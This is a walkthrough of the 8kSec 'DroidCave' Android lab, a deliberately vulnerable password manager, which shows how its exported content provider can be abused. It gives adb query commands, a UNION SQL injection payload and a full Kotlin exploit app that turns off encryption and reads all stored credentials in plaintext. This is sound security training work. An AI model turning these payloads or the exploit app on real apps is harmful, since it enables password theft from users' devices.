---
title: "DroidCave - Secure Password Management"
date: 2026-06-27 21:20:00 +0800
categories: [Android]
tags: [8ksec, Android Pentest, Content Provider 8ksec, sql injection, IPC]
---

# Description

In the given challenge we were provided with an `DroidCave.apk` , which was basically a password manager. Our goal is to develop an Malicious Android application with an innocent appearance that can, with just one click of a seemingly normal button, steal both plaintext passwords and the decrypted form of encrypted passwords from the DroidCave database.

![Saving couple of password](/images/DroidCave/image.png)
_Saving couple of password_

# Analysis

As very first step we open the `DroidCave.apk` in `jadx-gui` and start to look in `AndroidManifest.xml` . We get `com.eightksec.droidcave.provider.PasswordContentProvider` provider which is exported.

![Provider with Exported:true](/images/DroidCave/image%201.png)
_Provider with Exported:true_

Looking into `com.eightksec.droidcave.provider.PasswordContentProvider` , we find out that it has `uriMatcher` things .

![image.png](/images/DroidCave/image%202.png)

## Query Method

In its `Cursor query` method, it checks which of the above patterns the provider request URI matches, and executes the operation accordingly.

![image.png](/images/DroidCave/image%203.png)
If we look into AppDatabase (`com.eightksec.droidcave.data.AppDatabase`), its actually creating the database file named as `droidcave_database`  if doesn't exist, but if does its returning the instance of it.

### Case 1

`uriMatcher.addURI(AUTHORITY, "passwords", 1);` is the routing requirement for case 1. If provider request looks like `com.eightksec.droidcave.provider/passwords` , then it gets executed. If we don't pass the projection it will pass select every column of passwords table.

![Case 1](/images/DroidCave/image%204.png)
_Case 1_

```jsx
adb shell 'content query --uri "content://com.eightksec.droidcave.provider/passwords/"'
```

![output received on matching case 1](/images/DroidCave/image%205.png)
_output received on matching case 1_

### Case 2 - Search Password by ID:

Here we can search the password by id.

```jsx
adb shell 'content query --uri "content://com.eightksec.droidcave.provider/passwords/1"'
```

![Example of searching password of id 1](/images/DroidCave/image%206.png)
_Example of searching password of id 1_

![image.png](/images/DroidCave/image%207.png)
_Here, URI lastPathSegment is expected to be the id of target password. Using that query is executed._

```jsx
adb shell 'content query --uri "content://com.eightksec.droidcave.provider/passwords/#"'
```

![image.png](/images/DroidCave/image%208.png)

### Case 3 - Search Password Based on name, username or notes:

In this case, we can search the password by name or username or notes.

```jsx
uriMatcher.addURI(AUTHORITY, "password_search/*", 3);
```

![Code Execution for case 3](/images/DroidCave/image%209.png)
_Code Execution for case 3_

![Searching `username` keyword](/images/DroidCave/image%2010.png)
_Searching `username` keyword_

### Case 4:

While adding password in our lab there was 3 types of category `LOGIN` , `CARD`  and `NOTE` . We can use `/password_type` route to get the result filtering with type.

![Example usage of password_type route](/images/DroidCave/image%2011.png)
_Example usage of password_type route_

Since it is joining the user input directly with sql queries, there is no any sanitization. Here we can carry out the sql injection.

![Figuring out the total number of column.](/images/DroidCave/image%2012.png)
_Figuring out the total number of column._

```jsx
adb shell 'content query --uri "content://com.eightksec.droidcave.provider/password_type/x'\'' UNION SELECT sql,2,3,4,5,6,7,8,9,10,11 FROM sqlite_master--"'
```

![Dumping all 11 column with sqlinjection](/images/DroidCave/image%2013.png)
_Dumping all 11 column with sqlinjection_

### Case 5:

![Router to execute case 5.](/images/DroidCave/image%2014.png)
_Router to execute case 5._

![Code Logic of Case 5](/images/DroidCave/image%2015.png)
_Code Logic of Case 5_

![Dumping everything from `passwords` table using case 5 logic.](/images/DroidCave/image%2016.png)
_Dumping everything from `passwords` table using case 5 logic._

### Case 6:

#### Part 1: Reading `encryption_enabled` from sharedPreferences

![image.png](/images/DroidCave/image%2017.png)

![image.png](/images/DroidCave/image%2018.png)
Here, the route handling `/settings` is checking is uri last segments starts with `get_` , if yes then it as slicing off the `get_` part then checking if remaining part is equal to value of `KEY_ENCRYPTION_ENABLED` variable thats on SettingsViewModel. The value of `KEY_ENCRYPTION_ENABLED` is `encryption_enabled` . In overall, it is checking that if route URI looks like `/settings/get_encryption_enabled` , if yes it is reading `encryption_enabled` key value from `sharedPreferences` and returning. The returned value is stored in matrixCursor6 which is basically passed to `matrixCursor4` and returned at the end of case 6.

Along with that, if route URI doesn't looks like `/settings/get_encryption_enabled` then it was checking if look like `/settings/get_all` . If it matches is reading `encryption_enabled` key value from `sharedPreferences` and returning.

![image.png](/images/DroidCave/image%2019.png)

#### Part 2: Updating `encryption_enabled` value in sharedPreferences

![Code logic inside else of case 6](/images/DroidCave/image%2020.png)
_Code logic inside else of case 6_

In the `else` block, it checks whether `lastPathSegments` starts with `set_`. If it does, the string is split by `=`, and the first part is compared against `KEY_ENCRYPTION_ENABLED`, whose value is `encryption_enabled`. If that matches, it then compares our input with `true`. If they are equal, `zEquals` is set to `true`; otherwise, it is set to `false`. It then updates the `encryption_enabled` value in `sharedPreferences` based on the value we provided to the content provider. Along with that, it also queries the provider path to encrypt or decrypt based on the `zEquals`value.

![image.png](/images/DroidCave/image%2021.png)

### Case 7 - Decryption of Encrypted Passwords

```jsx
    private static final String PATH_DISABLE_ENCRYPTION = "disable_encryption";
    private static final String PATH_ENABLE_ENCRYPTION = "enable_encryption";
```

![image.png](/images/DroidCave/image%2022.png)

![Initially updating the sharedPreferences to set `encryption_enabled` to false](/images/DroidCave/image%2023.png)
_Initially updating the sharedPreferences to set `encryption_enabled` to false_

![Decryption Process Logic](/images/DroidCave/image%2024.png)
_Decryption Process Logic_

Fetching the password from those row which has `isEncrypted` is `1` in `passwords` table of database then decrypting with method `decrypt` from `encryptionService` . Updating the `isEncrypted` value to 0 and updating the password with bytes of decrypted password.

If any error occur in try block, then original password is getting replaced with `password123` .

![On any error on tryblock passwords is getting set as password123](/images/DroidCave/image%2025.png)
_On any error on tryblock passwords is getting set as `password123`._

If we lookinto decrypt function it is basically utilizing the android keystore to decrypt the password than using our master key.

![Decryption logic](/images/DroidCave/image%2026.png)
_Decryption logic_

![GetSecretKey logic used in decryption logic](/images/DroidCave/image%2027.png)
_GetSecretKey logic used in decryption logic_

### Case 8 - Password Encryption:

![Routing for case 8](/images/DroidCave/image%2028.png)
_Routing for case 8_

![PATH_ENABLE_ENCRPTION variable value](/images/DroidCave/image%2029.png)
_PATH_ENABLE_ENCRPTION variable value_

Initially they are updating the `enable_encryption` key value to true on sharedPreferences.

![image.png](/images/DroidCave/image%2030.png)
Then, all the passwords with `isEncrypted` to `0` are fetched from database, then they are encrypted with `encrypt` method of `encryptionService` which basically utilized the keystore to generate a secret key and use that to encrypt the password. Then, encrypted output bytes are written back into database with `isEncrypted true` .

![Logical flow of encryption](/images/DroidCave/image%2031.png)
_Logical flow of encryption_

### Case 9 - Updating Password by passing in base64 format

![Case 9 Route](/images/DroidCave/image%2032.png)
_Case 9 Route_

![Logic of case 9](/images/DroidCave/image%2033.png)
_Logic of case 9_

In case 9, it is expecting the URI format in `set_password_plaintext/{id}/{base64_plaintext}` , and using that to  update the password for respective id. Before updating its doing base64 decode and output blob is updated in database.

![Triggering case 9 to update password of id 1 and fetching to verify if actually updated.](/images/DroidCave/image%2034.png)
_Triggering case 9 to update password of id 1 and fetching to verify if actually updated._

## Insert Method

Besides query, insert was performing the insertion on database

![insert code logic](/images/DroidCave/image%2035.png)
_insert code logic_

## Update Method

Update of content provider was getting executed if it matches the case 1 or case 2 and it was updating password.

![image.png](/images/DroidCave/image%2036.png)

## Delete Method

Similarly, delete can be used to perform delete operation in passwords tables but it should match either case 1 query structure of case 2 query structure.

![image.png](/images/DroidCave/image%2037.png)

## Exploit Application

```jsx
package com.nirajneupane08.droidcaveexploit

import android.annotation.SuppressLint
import android.net.Uri
import android.os.Bundle
import androidx.activity.ComponentActivity
import androidx.activity.compose.setContent
import androidx.activity.enableEdgeToEdge
import androidx.compose.foundation.layout.Column
import androidx.compose.foundation.layout.fillMaxSize
import androidx.compose.foundation.layout.fillMaxWidth
import androidx.compose.foundation.layout.padding
import androidx.compose.foundation.lazy.LazyColumn
import androidx.compose.foundation.lazy.items
import androidx.compose.material3.ButtonDefaults
import androidx.compose.material3.HorizontalDivider
import androidx.compose.material3.MaterialTheme
import androidx.compose.material3.OutlinedButton
import androidx.compose.material3.Scaffold
import androidx.compose.material3.Text
import androidx.compose.runtime.Composable
import androidx.compose.runtime.getValue
import androidx.compose.runtime.mutableStateOf
import androidx.compose.runtime.remember
import androidx.compose.runtime.setValue
import androidx.compose.ui.Modifier
import androidx.compose.ui.graphics.Color
import androidx.compose.ui.text.font.FontWeight
import androidx.compose.ui.unit.dp
import com.nirajneupane08.droidcaveexploit.ui.theme.DroidcaveexploitTheme

data class Credential(
    val id: String,
    val name: String,
    val username: String,
    val password: String
)

class MainActivity : ComponentActivity() {
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        enableEdgeToEdge()
        setContent {
            DroidcaveexploitTheme {
                Scaffold(modifier = Modifier.fillMaxSize()) { innerPadding ->
                    ExploitScreen(modifier = Modifier.padding(innerPadding))
                }
            }
        }
    }

    @SuppressLint("Range")
    private fun triggerExploit(): List<Credential> {
        val list = mutableListOf<Credential>()
        try {
            // 1. Trigger disable_encryption
            val disableUri = Uri.parse("content://com.eightksec.droidcave.provider/disable_encryption")
            contentResolver.query(disableUri, null, null, null, null)?.close()

            // 2. Query for passwords including name and username
            val sql = "SELECT id, name, username, CAST(password AS TEXT) as pw FROM passwords"
            val queryUri = Uri.parse("content://com.eightksec.droidcave.provider/execute_sql/${Uri.encode(sql)}")
            
            contentResolver.query(queryUri, null, null, null, null)?.use { cursor ->
                while (cursor.moveToNext()) {
                    val id = cursor.getString(cursor.getColumnIndex("id")) ?: ""
                    val name = cursor.getString(cursor.getColumnIndex("name")) ?: ""
                    val username = cursor.getString(cursor.getColumnIndex("username")) ?: ""
                    val pw = cursor.getString(cursor.getColumnIndex("pw")) ?: ""
                    list.add(Credential(id, name, username, pw))
                }
            }
        } catch (e: Exception) {
            list.add(Credential("Error", e.message ?: "Exploit failed", "", ""))
        }
        return list
    }

    @Composable
    fun ExploitScreen(modifier: Modifier = Modifier) {
        var credentials by remember { mutableStateOf(emptyList<Credential>()) }

        Column(modifier = modifier.padding(16.dp)) {
            OutlinedButton(
                onClick = { credentials = triggerExploit() },
                modifier = Modifier
                    .fillMaxWidth()
                    .padding(bottom = 16.dp),
                colors = ButtonDefaults.outlinedButtonColors(
                    contentColor = Color.DarkGray
                )
            ) {
                Text(
                    text = "RUN EXPLOIT",
                    fontWeight = FontWeight.Bold
                )
            }

            LazyColumn {
                items(credentials) { cred ->
                    Column(modifier = Modifier.padding(vertical = 8.dp)) {
                        Text(text = "ID: ${cred.id}", style = MaterialTheme.typography.labelSmall)
                        Text(text = "Name: ${cred.name}", style = MaterialTheme.typography.bodyLarge, fontWeight = FontWeight.Bold)
                        Text(text = "Username: ${cred.username}", style = MaterialTheme.typography.bodyMedium)
                        Text(text = "Password: ${cred.password}", style = MaterialTheme.typography.bodyLarge)
                        HorizontalDivider(modifier = Modifier.padding(top = 8.dp))
                    }
                }
            }
        }
    }
}

```

![Running exploit application is triggering the decryption and showing the decrypted passwords.](/images/DroidCave/image%2038.png)
_Running exploit application is triggering the decryption and showing the decrypted passwords._
